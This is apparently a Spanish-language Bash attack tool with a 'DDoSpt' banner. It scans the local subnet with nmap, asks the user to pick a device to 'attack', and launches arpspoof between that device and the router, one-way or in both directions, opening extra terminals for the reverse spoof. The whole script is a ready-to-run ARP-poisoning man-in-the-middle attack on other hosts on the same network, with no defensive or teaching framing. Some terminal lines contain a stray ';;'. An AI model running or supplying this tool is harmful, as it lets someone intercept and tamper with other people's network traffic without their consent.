#!/usr/bin/env bash
set -euo pipefail

trap ctrl_c INT

ctrl_c() {
    echo
    echo "Saliendo..."
    exit 1
}
ip="$(hostname -I | awk '{print $1}')"

ascii() {
    echo -e "\e[31m###################################################################################################################################################################################################################\e[0m"        
    echo -e "\e[32m                                                                                   ██████╗ ██████╗          ███████╗                 \e[0m"
    echo -e "\e[32m                                                                                   ██╔══██╗██╔══██╗██████╗  ██╔════╝██████╗ ████████╗\e[0m"
    echo -e "\e[32m                                                                                   ██║  ██║██║  ██║██╔═══██╗███████╗██╔══██╗╚══██╔══╝\e[0m"
    echo -e "\e[32m                                                                                   ██║  ██║██║  ██║██║   ██║╚════██║██████╔╝   ██║   \e[0m"
    echo -e "\e[32m                                                                                   ██████╔╝██████╔╝╚██████╔╝███████║██╔═══╝    ██║   \e[0m"
    echo -e "\e[32m                                                                                   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝        ╚═╝   \e[0m"
    echo -e "\e[31m###################################################################################################################################################################################################################\e[0m"
}
clear
echo -e "\e[31m###################################################################################################################################################################################################################\e[0m"        
echo -e "\e[32m                                                                                   ██████╗ ██████╗          ███████╗                 \e[0m"
echo -e "\e[32m                                                                                   ██╔══██╗██╔══██╗██████╗  ██╔════╝██████╗ ████████╗\e[0m"
echo -e "\e[32m                                                                                   ██║  ██║██║  ██║██╔═══██╗███████╗██╔══██╗╚══██╔══╝\e[0m"
echo -e "\e[32m                                                                                   ██║  ██║██║  ██║██║   ██║╚════██║██████╔╝   ██║   \e[0m"
echo -e "\e[32m                                                                                   ██████╔╝██████╔╝╚██████╔╝███████║██╔═══╝    ██║   \e[0m"
echo -e "\e[32m                                                                                   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝        ╚═╝   \e[0m"
echo -e "\e[36m                                                                                      dependencias necesarias: (nmap y dsniff)\e[0m"
echo -e "\e[31m###################################################################################################################################################################################################################\e[0m"
echo "se empezara escaneando los dispositivos en la red"
echo "Se escaneará por defecto en /24."
while true; do
    read -p "¿Desea ese rango? (s/n): " respuesta_rango
    respuesta_rango="${respuesta_rango,,}"
    if [[ $respuesta_rango == "s" ]]; then
        rango="${ip%.*}.0/24"
        break
    elif [[ $respuesta_rango == "n" ]]; then
        while true; do
            read -p "Ingrese el prefijo CIDR deseado (0-32, por ejemplo 24): " rango_deseado
            if [[ $rango_deseado =~ ^([0-9]|[12][0-9]|3[0-2])$ ]]; then
                rango="${ip%.*}.0/${rango_deseado}"
                break
            else
                echo "Prefijo inválido. Debe ser un número entre 0 y 32."
            fi
        done
        break
    else
        echo "Respuesta no válida."
    fi
done
clear
ascii
echo -e "\e[36mcuando termine de escanear presione ENTER...\e[0m"
echo "Escaneando en el rango: $rango..."
sudo nmap -sn "$rango"
read -p ""
while true; do
	read -p "que dispositivo desea atacar (ingrese el host ID de la ip):" host_id
	if [[ "$host_id" -lt 2 || "$host_id" -gt 254 ]]; then
        echo "Ingrese un numero entre 2 y 254"
        sleep 2
        continue
	else
		ip_objetivo="${ip%.*}.$host_id"
		echo "el objetivo sera: $ip_objetivo"
		break
	fi
done
interfaz_red_defecto=$(ip -o addr show | grep "$ip" | awk '{print $2}')
while true; do
    clear 
    ascii
    echo "ingrese la interfaz de red a usar:"
    echo "1-por defecto en tu sistema:$interfaz_red_defecto"
    echo "2-manual"
    read -p "(1-2):" pregunta_interfaz
    if [[ $pregunta_interfaz == "1" ]]; then
        interfaz_red="$interfaz_red_defecto"
        break
    elif [[ $pregunta_interfaz == "2" ]]; then
        read -p "ingrese la interfaz de red a usar (ejemplo: eth0, wlan0): " interfaz_red
        break
    else
        echo "Opción no válida, intente de nuevo"
    fi
done
clear
ascii    
router="${ip%.*}.1"
echo "como desea el ataque:"
echo "1- unidireccional (ataque en la comunicacion entre la victima y el router)"
echo "2- bidireccional (ataque en la comunicacion entre la victima y el router y biceversa al mismo tiempo, se habriran dos terminales para pararlo presione CTRL+C en ambas)"
read -p ":" direcciones
if [[ $direcciones == "1" ]]; then
    clear
    echo "Iniciando ataque unidireccional..."
    sudo arpspoof -i $interfaz_red -t $ip_objetivo $router
elif [[ $direcciones == "2" ]]; then
    clear
    ascii
    echo "¿cual es su interfaz grafica?"
    echo "1- GNOME"
    echo "2- XFCE"
    echo "3- KDE"
    echo "4- MATE"
    echo "5- LXDE"
    echo "6- LXqt"
    echo "7- Terminator"
    echo "8- Deepin Terminal"
    echo "9- Otro / Ninguno"
    read -p "(1-9):" interfaz_grafica
    inverso="sudo arpspoof -i $interfaz_red -t $router $ip_objetivo"
    directo="sudo arpspoof -i $interfaz_red -t $ip_objetivo $router"
    if [[ $interfaz_grafica == "1" ]]; then
        clear
        echo "Iniciando ataque bidireccional..."
        gnome-terminal -- bash -c "$inverso; exec bash" &
        $directo
    elif [[ $interfaz_grafica == "2" ]]; then
        clear
        echo "Iniciando ataque bidireccional..."
        xfce4-terminal --command "bash -c '$inverso; exec bash'" &
        $directo
    elif [[ $interfaz_grafica == "3" ]]; then
        clear
        echo "Iniciando ataque bidireccional..."
        konsole -e bash -c "$inverso; exec bash" &
        $directo
    elif [[ $interfaz_grafica == "4" ]]; then
        clear
        echo "Iniciando ataque bidireccional..."
        mate-terminal -- bash -c "$inverso; exec bash" &
        $directo
    elif [[ $interfaz_grafica == "5" ]]; then
        clear
        echo "Iniciando ataque bidireccional..."
        lxterminal -e "bash -c '$inverso;; exec bash'" &
        $directo
    elif [[ $interfaz_grafica == "6" ]]; then
        clear
        echo "Iniciando ataque bidireccional..."
        qterminal -e "bash -c '$inverso;; exec bash'" &
        $directo
    elif [[ $interfaz_grafica == "7" ]]; then
        clear
        echo "Iniciando ataque bidireccional..."
        terminator -x bash -c "$inverso;; exec bash" &
        $directo
    elif [[ $interfaz_grafica == "8" ]]; then
        clear
        echo "Iniciando ataque bidireccional..."
        deepin-terminal -e "bash -c '$inverso;; exec bash'" &
        $directo
    elif [[ $interfaz_grafica == "9" ]]; then
        clear
        ascii
        echo "Por favor, si tiene interfaz grafica abra una nueva terminal y ejecute el siguiente comando:"
        echo "$inverso"
        echo "Presione ENTER para continuar con el ataque directo..."
        read -p ""
        clear
        $directo
    else
        clear
        ascii
        echo "Opción no válida. Saliendo."
        exit 1
    fi
else
    clear
    ascii
    echo "Opción no válida. Saliendo."
    exit 1
fi
